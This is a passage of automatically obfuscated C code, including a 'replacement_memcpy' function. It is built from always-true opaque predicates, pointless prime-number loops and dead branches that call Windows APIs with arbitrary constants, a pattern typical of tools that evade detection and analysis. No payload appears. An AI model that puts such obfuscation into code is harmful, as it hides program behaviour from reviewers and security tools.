              v05f44f9e603630a19bfc107496b2c0c4_random_opaque = v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque % vcded443be35d018a8e321e5555b7d5f6_random_opaque;
              v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque = v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque | vcded443be35d018a8e321e5555b7d5f6_random_opaque;
              vcded443be35d018a8e321e5555b7d5f6_random_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque - v73fb19f14e84291005bef6d31be80649_useless_opaque;
              vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque - v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque;
              ve7afb174c2061d73e516974dd0ad2a34_computation_opaque = v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque - vb38d3345cdd9e36a8a0acdee520db413_useless_opaque;
            }
          }
          while (vbf90ab1b9f05a60956513360a3597138_computation_opaque != ((unsigned int) 1))
          {
            if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long v732ee83f7464b9a0762612b8414a1f07 = (unsigned long) 0x413f52f0;
              unsigned long v7fa4f153c88741f706ff35bb50640af9 = (unsigned long) 0xa3dab6c9;
              if ((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25)))
              {
                void * ve30246a27ea1398d7b8080d742b743af = (void *) 0x3ac36eb5;
                int vb48fb18046cf5c489100d5ffd54e41e6 = (int) 0x3cb3a287;
                int v44a01464829869f1d5281019fd8fe517 = (int) 0x315c3a6b;
                v44a01464829869f1d5281019fd8fe517 = GetLocaleInfoW(v732ee83f7464b9a0762612b8414a1f07, v7fa4f153c88741f706ff35bb50640af9, ve30246a27ea1398d7b8080d742b743af, vb48fb18046cf5c489100d5ffd54e41e6);
              }
            }
            ve7afb174c2061d73e516974dd0ad2a34_computation_opaque += (unsigned int) 2;
            vbf90ab1b9f05a60956513360a3597138_computation_opaque = (unsigned int) 1;
            v2bcc21212d47aa97cac288cf2df86595_computation_opaque = (unsigned int) 3;
            while ((v2bcc21212d47aa97cac288cf2df86595_computation_opaque * v2bcc21212d47aa97cac288cf2df86595_computation_opaque) <= ve7afb174c2061d73e516974dd0ad2a34_computation_opaque)
            {
              if ((ve7afb174c2061d73e516974dd0ad2a34_computation_opaque % v2bcc21212d47aa97cac288cf2df86595_computation_opaque) == ((unsigned int) 0))
              {
                vbf90ab1b9f05a60956513360a3597138_computation_opaque = (unsigned int) 0;
              }
              if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
              {
                vb16fc9e9af2e439cd1f6fb1322e48f03_useless_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque != v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                vcded443be35d018a8e321e5555b7d5f6_random_opaque = v2bcc21212d47aa97cac288cf2df86595_computation_opaque | v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                v20f3375cce7738bb811ac35bf674c06b_useless_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque == v73fb19f14e84291005bef6d31be80649_useless_opaque;
                v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque = vb38d3345cdd9e36a8a0acdee520db413_useless_opaque < v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = vb38d3345cdd9e36a8a0acdee520db413_useless_opaque / v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                vb16fc9e9af2e439cd1f6fb1322e48f03_useless_opaque = vb16fc9e9af2e439cd1f6fb1322e48f03_useless_opaque <= v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
              }
              v2bcc21212d47aa97cac288cf2df86595_computation_opaque = v2bcc21212d47aa97cac288cf2df86595_computation_opaque + ((unsigned int) 2);
            }

          }

          unsigned int v6a307ffc09ab532578361310e06f6842_prime_opaque = ve7afb174c2061d73e516974dd0ad2a34_computation_opaque;
          v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque = (unsigned int) 3;
        }
      }
    }
    while (v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque != ((unsigned int) 1))
    {
      v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque += (unsigned int) 2;
      unsigned int vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque = (unsigned int) 596958704;
      unsigned int v42f10236e0a1e50e6300b757c0de7000_computation_opaque = (unsigned int) 0;
      unsigned int v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque = (unsigned int) 3;
      unsigned int va04976225eb960b0a8c43711038cc071_computation_opaque = (unsigned int) (&vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque);
      va04976225eb960b0a8c43711038cc071_computation_opaque = (va04976225eb960b0a8c43711038cc071_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
      {
        if ((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25)))
        {
          if (va04976225eb960b0a8c43711038cc071_computation_opaque < ((unsigned int) 3))
          {
            if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
            {
              vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque = va04976225eb960b0a8c43711038cc071_computation_opaque <= v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque;
              if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
              {
                va04976225eb960b0a8c43711038cc071_computation_opaque = v20f3375cce7738bb811ac35bf674c06b_useless_opaque == v73fb19f14e84291005bef6d31be80649_useless_opaque;
              }
            }
            if ((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25)))
              {
                va04976225eb960b0a8c43711038cc071_computation_opaque = (unsigned int) 3;
              }
            }
          }
          while (v42f10236e0a1e50e6300b757c0de7000_computation_opaque != ((unsigned int) 1))
          {
            va04976225eb960b0a8c43711038cc071_computation_opaque += (unsigned int) 2;
            v42f10236e0a1e50e6300b757c0de7000_computation_opaque = (unsigned int) 1;
            v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque = (unsigned int) 3;
            while ((v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque * v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque) <= va04976225eb960b0a8c43711038cc071_computation_opaque)
            {
              if ((va04976225eb960b0a8c43711038cc071_computation_opaque % v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque) == ((unsigned int) 0))
              {
                v42f10236e0a1e50e6300b757c0de7000_computation_opaque = (unsigned int) 0;
                if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
                {
                  unsigned long v107225bc9881c8f1eda13bc4db660738 = (unsigned long) 0x8a36431f;
                  void * vb148e881a77a4cc809db658bc05e0554 = (void *) 0x6cf5daf1;
                  int v525de6fde6af8de5956504f3e88fe696 = (int) 0xcd6c2db9;
                  void * v0dfd167eddd8e85f2c2685e7e60429f6 = (void *) 0xd32d67a3;
                  int v961bfdc9fae4f17d0e06a846f2a2cee2 = (int) 0x7173a7f5;
                  int vc0dabbd09c6a323d6517f3ac7158fd6e = (int) 0xc7bcccdc;
                  if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
                  {
                    void * v32fa78ecf82b8abda510746b346cc9c8 = (void *) 0x57382d09;
                    long v3f5fc15cc50d91e416384ec3c0f0dd6e = (long) 0x662d14ec;
                    v3f5fc15cc50d91e416384ec3c0f0dd6e = RoUnregisterForApartmentShutdown(v32fa78ecf82b8abda510746b346cc9c8);
                  }
                  vc0dabbd09c6a323d6517f3ac7158fd6e = IdnToNameprepUnicode(v107225bc9881c8f1eda13bc4db660738, vb148e881a77a4cc809db658bc05e0554, v525de6fde6af8de5956504f3e88fe696, v0dfd167eddd8e85f2c2685e7e60429f6, v961bfdc9fae4f17d0e06a846f2a2cee2);
                }
                if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
                {
                  vcded443be35d018a8e321e5555b7d5f6_random_opaque = v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque + v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                  v05f44f9e603630a19bfc107496b2c0c4_random_opaque = v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque <= v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque;
                }
              }
              v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque = v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque + ((unsigned int) 2);
              if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
              {
                v05f44f9e603630a19bfc107496b2c0c4_random_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque % vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque;
                v20f3375cce7738bb811ac35bf674c06b_useless_opaque = v42f10236e0a1e50e6300b757c0de7000_computation_opaque != v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque;
                v42f10236e0a1e50e6300b757c0de7000_computation_opaque = v20f3375cce7738bb811ac35bf674c06b_useless_opaque || va04976225eb960b0a8c43711038cc071_computation_opaque;
                v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque = vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque + v73fb19f14e84291005bef6d31be80649_useless_opaque;
                v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque = v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque * v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque;
              }
            }

            if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long vb3c1272b055ce8435ef25e8fd6596026 = (unsigned long) 0x96a69f95;
              unsigned long v44e6f137fb18082ca11064957b8ebb9d = (unsigned long) 0xf947015d;
              v44e6f137fb18082ca11064957b8ebb9d = MsiGetActiveDatabase(vb3c1272b055ce8435ef25e8fd6596026);
            }
          }

          unsigned int v23deeec5c6218ee0742c2887b568fb0e_prime_opaque = va04976225eb960b0a8c43711038cc071_computation_opaque;
          v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque = (unsigned int) 1;
          v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque = (unsigned int) 3;
          while ((v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque * v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque) <= v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque)
          {
            if ((v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque % v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque) == ((unsigned int) 0))
            {
              if (!((((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 9)) + ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 16))) == ((vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcded443be35d018a8e321e5555b7d5f6_random_opaque) * ((unsigned int) 25))))
              {
                unsigned long v213be458131a21215ddfea2295ad6237 = (unsigned long) 0xefccb016;
                unsigned long vc667441b12355e023e5c0bc1a4eb65a8 = (unsigned long) 0xf59799c9;
                if (((v23deeec5c6218ee0742c2887b568fb0e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v23deeec5c6218ee0742c2887b568fb0e_prime_opaque == ((unsigned int) 2)))
                {
                  void * vea133994dbe72c050ac1f22b122e16e5 = (void *) 0x8356812a;
                  int v9073fe656479cc5445563553eb9061af = (int) 0x1ac5b428;
                  int v8b7b58faa24337fc3237ad01ca46283b = (int) 0xf014982c;
                  v8b7b58faa24337fc3237ad01ca46283b = GetLocaleInfoW(v213be458131a21215ddfea2295ad6237, vc667441b12355e023e5c0bc1a4eb65a8, vea133994dbe72c050ac1f22b122e16e5, v9073fe656479cc5445563553eb9061af);
                }
              }
              if (!(((v23deeec5c6218ee0742c2887b568fb0e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v23deeec5c6218ee0742c2887b568fb0e_prime_opaque == ((unsigned int) 2))))
              {
                vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque || v23deeec5c6218ee0742c2887b568fb0e_prime_opaque;
                v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque < vb38d3345cdd9e36a8a0acdee520db413_useless_opaque;
                vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque % v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque;
                v20f3375cce7738bb811ac35bf674c06b_useless_opaque = vcded443be35d018a8e321e5555b7d5f6_random_opaque * vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque;
                if (((v23deeec5c6218ee0742c2887b568fb0e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v23deeec5c6218ee0742c2887b568fb0e_prime_opaque == ((unsigned int) 2)))
                {
                  v20f3375cce7738bb811ac35bf674c06b_useless_opaque = v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque <= v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque;
                  v20f3375cce7738bb811ac35bf674c06b_useless_opaque = v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque == v20f3375cce7738bb811ac35bf674c06b_useless_opaque;
                  vcded443be35d018a8e321e5555b7d5f6_random_opaque = vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque / v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                  if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
                  {
                    v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque = vb38d3345cdd9e36a8a0acdee520db413_useless_opaque / v42f10236e0a1e50e6300b757c0de7000_computation_opaque;
                    vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = v20f3375cce7738bb811ac35bf674c06b_useless_opaque / va04976225eb960b0a8c43711038cc071_computation_opaque;
                    va04976225eb960b0a8c43711038cc071_computation_opaque = vb38d3345cdd9e36a8a0acdee520db413_useless_opaque + va04976225eb960b0a8c43711038cc071_computation_opaque;
                    v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque = vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque / vb38d3345cdd9e36a8a0acdee520db413_useless_opaque;
                    vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = v42f10236e0a1e50e6300b757c0de7000_computation_opaque || v23deeec5c6218ee0742c2887b568fb0e_prime_opaque;
                    v5f343d20cf0d8d5872b58c7af9468a56_computation_opaque = v23deeec5c6218ee0742c2887b568fb0e_prime_opaque - va04976225eb960b0a8c43711038cc071_computation_opaque;
                  }
                }
              }
              v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque = (unsigned int) 0;
            }
            if (((v23deeec5c6218ee0742c2887b568fb0e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v23deeec5c6218ee0742c2887b568fb0e_prime_opaque == ((unsigned int) 2)))
            {
              if (((v23deeec5c6218ee0742c2887b568fb0e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v23deeec5c6218ee0742c2887b568fb0e_prime_opaque == ((unsigned int) 2)))
              {
                if (((v23deeec5c6218ee0742c2887b568fb0e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v23deeec5c6218ee0742c2887b568fb0e_prime_opaque == ((unsigned int) 2)))
                {
                  v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque = v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque + ((unsigned int) 2);
                }
                if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
                {
                  vcdfe5adb2b1b493efc9fefc7ccc549c2_useless_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque | va04976225eb960b0a8c43711038cc071_computation_opaque;
                  vb38d3345cdd9e36a8a0acdee520db413_useless_opaque = v73fb19f14e84291005bef6d31be80649_useless_opaque || v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                  vcded443be35d018a8e321e5555b7d5f6_random_opaque = v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque | v05f44f9e603630a19bfc107496b2c0c4_random_opaque;
                }
              }
              if ((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25)))
              {
                if (!((((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 9)) + ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 16))) == ((v05f44f9e603630a19bfc107496b2c0c4_random_opaque * v05f44f9e603630a19bfc107496b2c0c4_random_opaque) * ((unsigned int) 25))))
                {
                  v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque = v0a7a57f7235b758a831c8dfffc2d01e5_computation_opaque < ((unsigned int) 51);
                  vcded443be35d018a8e321e5555b7d5f6_random_opaque = v2a2b4d1d48e0c82179ae5f30602749c4_computation_opaque - v23deeec5c6218ee0742c2887b568fb0e_prime_opaque;
                }
              }
            }
          }

        }
      }
    }

    unsigned int v1a717f0f83af97597a25fc4500d2cc91_prime_opaque = v2f7f92c9644a48ef4629b351c022d6e5_computation_opaque;
  }
}

void *replacement_memcpy(void *dest, const void *src, size_t n)
{
  {
    unsigned int va1b165bc8df9652f85afbb02e5e74a09_useless_opaque = (unsigned int) 599667092;
    unsigned int va7b20c265956b297cf8d396a2d429d30_computation_opaque = (unsigned int) 0;
    unsigned int vc381cff01edd1f184a7634d96d023102_useless_opaque = (unsigned int) 3009222725;
    unsigned int v784685fc2ad0966092bfefe67d3b2f6e_random_opaque = (unsigned int) (&vc381cff01edd1f184a7634d96d023102_useless_opaque);
    unsigned int ve97337ed6eddfd438a6750c37f33a099_computation_opaque = (unsigned int) 3;
    unsigned int va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = (unsigned int) (&va1b165bc8df9652f85afbb02e5e74a09_useless_opaque);
    va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = (va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque < ((unsigned int) 3))
    {
      va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = (unsigned int) 3;
      unsigned int vac5e07153f7ea6f3b1a802c380134ce5_useless_opaque = (unsigned int) 2867131771;
      unsigned int v8aa1f4314c591429346242aead35b54b_computation_opaque = (unsigned int) 0;
      unsigned int vb93e3da26b7a07f295c21cae9661296e_computation_opaque = (unsigned int) 3;
      unsigned int vab904d38200e21634b8e5e1df37c5999_computation_opaque = (unsigned int) (&vac5e07153f7ea6f3b1a802c380134ce5_useless_opaque);
      vab904d38200e21634b8e5e1df37c5999_computation_opaque = (vab904d38200e21634b8e5e1df37c5999_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vab904d38200e21634b8e5e1df37c5999_computation_opaque < ((unsigned int) 3))
      {
        if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
        {
          unsigned long vaf76eb7d957cb71817a368c0caa111f4 = (unsigned long) 0x7bb95bef;
          unsigned long va768ed30a0c9cff55a09cc42fed3f08d = (unsigned long) 0xbe76fce8;
          void * v9d9d3b7a39ccefe22f754a948a2c9635 = (void *) 0x49f877bb;
          if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
          {
            void * va8ed9b552434d274e4866448743b7d94 = (void *) 0x89ef0619;
            if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
              {
                int v385ee8f4c86368ff13b081362ffce97d = (int) 0xf391b45f;
                v385ee8f4c86368ff13b081362ffce97d = RemoveDllDirectory(va8ed9b552434d274e4866448743b7d94);
              }
            }
          }
          int v91e81c797a0ea6dd055769d8001f5e1b = (int) 0xfa7a64e5;
          int va521a13e1ee28b4131a7f9bbdad883ae = (int) 0xe72acc91;
          va521a13e1ee28b4131a7f9bbdad883ae = GetLocaleInfoW(vaf76eb7d957cb71817a368c0caa111f4, va768ed30a0c9cff55a09cc42fed3f08d, v9d9d3b7a39ccefe22f754a948a2c9635, v91e81c797a0ea6dd055769d8001f5e1b);
        }
        vab904d38200e21634b8e5e1df37c5999_computation_opaque = (unsigned int) 3;
        if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
        {
          vc381cff01edd1f184a7634d96d023102_useless_opaque = v8aa1f4314c591429346242aead35b54b_computation_opaque % va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque;
        }
      }
      while (v8aa1f4314c591429346242aead35b54b_computation_opaque != ((unsigned int) 1))
      {
        vab904d38200e21634b8e5e1df37c5999_computation_opaque += (unsigned int) 2;
        if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
